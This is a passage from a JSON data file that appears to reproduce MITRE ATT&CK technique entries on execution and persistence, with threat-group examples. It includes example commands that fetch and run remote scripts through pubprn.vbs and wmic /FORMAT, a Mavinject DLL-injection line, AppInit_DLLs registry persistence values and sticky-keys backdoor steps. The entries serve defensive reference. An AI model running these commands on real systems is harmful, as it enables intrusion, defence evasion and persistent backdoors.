                    "Name": "Net Crawler",
                    "Description": "Net Crawler uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement.[9]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc registers itself as a service on the victim’s machine to run as a standalone process.[10]"
                },
                {
                    "Name": "PsExec",
                    "Description": "Microsoft Sysinternals PsExec is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[11]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy uses PsExec to execute a payload or commands on a remote host.[12]"
                },
                {
                    "Name": "RemoteCMD",
                    "Description": "RemoteCMD can execute commands remotely by creating a new service on the remote system.[13]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon creates a new service named \"ntssrv\" to execute the payload.[14]"
                },
                {
                    "Name": "Winexe",
                    "Description": "Winexe installs a service on the remote system, executes the command, then uninstalls the service.[15]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.[16][17]"
                },
                {
                    "Name": "xCmd",
                    "Description": "xCmd can be used to execute binaries on remote systems by creating and starting a service.[18]"
                }
            ]
        },
        "Signed Binary Proxy Execution": {
            "Name": "Signed Binary Proxy Execution",
            "Description": "Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.Mavinject.exeMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. [1]\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\"  /INJECTRUNNING C:\\Windows\\system32\\mavinject.exe  /INJECTRUNNING SyncAppvPublishingServer.exeSyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. [2]Several others binaries exist that may be used to perform similar behavior. [3]\n",
            "ID": "T1218",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting, Digital Certificate Validation",
            "Contributors: ": "Praetorian",
            "Version": "1.0"
        },
        "Signed Script Proxy Execution": {
            "Name": "Signed Script Proxy Execution",
            "Description": "Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. [1] Example command: cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.pngThere are several other signed scripts that may be used in a similar manner. [2]\n",
            "ID": "T1216",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting, Digital Certificate Validation",
            "Contributors: ": "Praetorian",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT32",
                    "Description": "APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.[3]"
                }
            ]
        },
        "Source": {
            "Name": "Source",
            "Description": "The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or . /path/to/filename [arguments]. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.\n",
            "ID": "T1153",
            "Tactic": "Execution",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, File monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Version": "1.0"
        },
        "Space after Filename": {
            "Name": "Space after Filename",
            "Description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to \"evil.txt \" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed [1]. Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.\n",
            "ID": "T1151",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring",
            "Contributors: ": "Erye Hernandez, Palo Alto Networks",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.[2]"
                }
            ]
        },
        "Third-party Software": {
            "Name": "Third-party Software",
            "Description": "Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.Adversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n",
            "ID": "T1072",
            "Tactic": "Execution, Lateral Movement",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Third-party application logs, Windows Registry, Process monitoring, Process use of network, Binary file metadata",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Threat Group-1314",
                    "Description": "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement.[1]"
                },
                {
                    "Name": "Wiper",
                    "Description": "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware.[2]"
                }
            ]
        },
        "Trap": {
            "Name": "Trap",
            "Description": "The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.\n",
            "ID": "T1154",
            "Tactic": "Execution, Persistence",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Version": "1.0"
        },
        "Trusted Developer Utilities": {
            "Name": "Trusted Developer Utilities",
            "Description": "There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.MSBuildMSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. [1] Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. [1] Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. [2]DNXThe .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. [3] DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. [4]RCSIThe rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. [5] The rcsi.exe binary is signed by Microsoft. [6]C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. [6]WinDbg/CDBWinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. [7] They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. [8]It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.TrackerThe file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. [9]An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. [10]\n",
            "ID": "T1127",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting",
            "Contributors: ": "Casey Smith; Matthew Demaske, Adaptforward",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "PlugX",
                    "Description": "A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.[11]"
                }
            ]
        },
        "User Execution": {
            "Name": "User Execution",
            "Description": "An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.\n",
            "ID": "T1204",
            "Tactic": "Execution",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Anti-virus, Process command-line parameters, Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 attempted to get users to click on Microsoft Excel attachments containing malicious macro scripts.[2]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 has used various forms of spearphishing attempting to get a user to open links or attachments.[3]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.[4]"
                },
                {
                    "Name": "APT33",
                    "Description": "APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails.[5]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has sent spearphishing attachments attempting to get a user to open them.[6]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.[7]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has sent emails containing malicious attachments or links that require users to execute a file or macro to infect the victim machine.[8]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.[9]"
                },
                {
                    "Name": "DarkHydrus",
                    "Description": "DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.[10][11]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 has used various forms of spearphishing in attempts to get users to open links or attachments.[12][13]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links and attachments.[14][15]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.[16]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has leveraged both Spearphishing Link and Spearphishing Attachment attempting to gain User Execution.[17][18][19]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.[20]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.[21]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has sent spearphishing emails links and attachments attempting to get a user to click.[22]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has attempted to get users to execute malware via social media and spearphishing emails.[23]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has attempted to get victims to open malicious files sent via email as part of spearphishing campaigns.[24][25][26]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.[27][28]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has delivered malicious links and macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.[29][30]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.[31][32]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.[33]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.[34]"
                },
                {
                    "Name": "TA459",
                    "Description": "TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.[35]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla has used spearphishing via a link to get users to download and run their malware.[36]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "A Word document delivering TYPEFRAME prompts the user to enable macro execution.[37]"
                }
            ]
        },
        "Windows Management Instrumentation": {
            "Name": "Windows Management Instrumentation",
            "Description": "Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) [1] and Remote Procedure Call Service (RPCS) [2] for remote access. RPCS operates over port 135. [3]An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. [4]\n",
            "ID": "T1047",
            "Tactic": "Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Authentication logs, Netflow/Enclave netflow, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "APT29 used WMI to steal credentials and execute backdoors at a future time.[5]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "A BlackEnergy 2 plug-in uses WMI to gather victim host details.[6]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use WMI to deliver a payload to a remote host.[7]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "The Deep Panda group is known to utilize WMI for lateral movement.[8]"
                },
                {
                    "Name": "DustySky",
                    "Description": "The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.[9]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC during and post compromise cleanup activities.[10][11]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).[12]"
                },
                {
                    "Name": "HALFBAKED",
                    "Description": "HALFBAKED can use WMI queries to gather system information.[13]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.[14]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can use WMI to execute commands.[15]"
                },
                {
                    "Name": "KOMPROGO",
                    "Description": "KOMPROGO is capable of running WMI queries.[16]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.[17][18]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used WMI for execution.[19]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass uses a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.[20][21]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito's installer uses WMI to search for antivirus display names.[22]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used WMI for execution.[23]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE uses WMI to perform discovery techniques.[24]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload.[25][26]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can use WMI queries to retrieve data from compromised hosts.[27]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may use WMI when collecting information about a victim.[28]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses WMI to perform process monitoring.[29][30]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin uses various WMI queries to check if the sample is running in a sandbox.[31]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).[32]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can use WMI to execute a binary.[33]"
                }
            ]
        },
        "Windows Remote Management": {
            "Name": "Windows Remote Management",
            "Description": "Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). [1] It may be called with the winrm command or by any number of programs such as PowerShell. [2]\n",
            "ID": "T1028",
            "Tactic": "Execution, Lateral Movement",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Authentication logs, Netflow/Enclave netflow, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use WinRM to execute a payload on a remote host.[3]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used WinRM to enable remote execution.[4]"
                }
            ]
        },
        "XSL Script Processing": {
            "Name": "XSL Script Processing",
            "Description": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to Trusted Developer Utilities, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4]Command-line example: [3]msxsl.exe customers[.]xml script[.]xslAnother variation of this technique, dubbed \"Squiblytwo\", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. [5] This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool.Command-line examples: [5]Local File: wmic process list /FORMAT:evil[.]xslRemote File: wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"\n",
            "ID": "T1220",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Process use of network, DLL monitoring",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Anti-virus, Application whitelisting, Digital Certificate Validation",
            "Contributors: ": "Casey Smith; Praetorian",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.[6]"
                }
            ]
        },
        ".bash_profile and .bashrc": {
            "Name": ".bash_profile and .bashrc",
            "Description": "~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed.Mac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling ~/.bash_profile each time instead of ~/.bashrc.These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  [1].\n",
            "ID": "T1156",
            "Tactic": "Persistence",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, Process use of network",
            "Version": "1.0"
        },
        "Accessibility Features": {
            "Name": "Accessibility Features",
            "Description": "Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. [1]Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP). [2] The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. [3]For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for the accessibility program (e.g., \"utilman.exe\"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the \"debugger\" program to be executed with SYSTEM privileges. [3]Other accessibility features exist that may also be leveraged in a similar fashion: [2]On-Screen Keyboard: C:\\Windows\\System32\\osk.exeMagnifier: C:\\Windows\\System32\\Magnify.exeNarrator: C:\\Windows\\System32\\Narrator.exeDisplay Switcher: C:\\Windows\\System32\\DisplaySwitch.exeApp Switcher: C:\\Windows\\System32\\AtBroker.exe\n",
            "ID": "T1015",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Effective Permissions: ": "SYSTEM",
            "Data Sources: ": "Windows Registry, File monitoring, Process monitoring",
            "CAPEC ID: ": "CAPEC-558",
            "Contributors: ": "Paul Speulstra, AECOM Global Security Operations Center",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "APT29 used sticky-keys to obtain unauthenticated, privileged console access.[4][5]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence.[6]"
                },
                {
                    "Name": "Axiom",
                    "Description": "Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.[7]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.[8]"
                }
            ]
        },
        "Account Manipulation": {
            "Name": "Account Manipulation",
            "Description": "Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.\n",
            "ID": "T1098",
            "Tactic": "Credential Access, Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "Authentication logs, API monitoring, Windows event logs, Packet capture",
            "Contributors: ": "Tim MalcomVetter",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to add created accounts to local admin groups to maintain elevated access.[1]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto adds permissions and remote logins to all users.[2]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 added newly created accounts to the administrators group to maintain elevated access.[3][4]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.[5][6]"
                },
                {
                    "Name": "Mimikatz",
                    "Description": "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.[7][8]"
                },
                {
                    "Name": "Skeleton Key",
                    "Description": "Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.[9]"
                }
            ]
        },
        "AppCert DLLs": {
            "Name": "AppCert DLLs",
            "Description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager are loaded into every process that calls the ubiquitously used application programming interface (API) functions: [1]CreateProcessCreateProcessAsUserCreateProcessWithLoginWCreateProcessWithTokenWWinExecSimilar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n",
            "ID": "T1182",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Effective Permissions: ": "Administrator, SYSTEM",
            "Data Sources: ": "Loaded DLLs, Process monitoring, Windows Registry",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee's service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.[2]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY can establish using a AppCertDLLs Registry key.[3]"
                }
            ]
        },
        "AppInit DLLs": {
            "Name": "AppInit DLLs",
            "Description": "Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. [1] Similar to Process Injection, these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. [2]The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. [3]\n",
            "ID": "T1103",
            "Tactic": "Persistence, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Effective Permissions: ": "Administrator, SYSTEM",
            "Data Sources: ": "Loaded DLLs, Process monitoring, Windows Registry",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cherry Picker",
                    "Description": "Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"[4]"
                },
                {
                    "Name": "T9000",
                    "Description": "If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1.[5]"
                }
            ]
        },
        "Application Shimming": {
            "Name": "Application Shimming",
            "Description": "The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. [1] Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses Hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\\AppPatch\\sysmain.sdbhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdbCustom databases are stored in:%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Customhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to Hooking, utilizing these shims may allow an adversary to perform several malicious 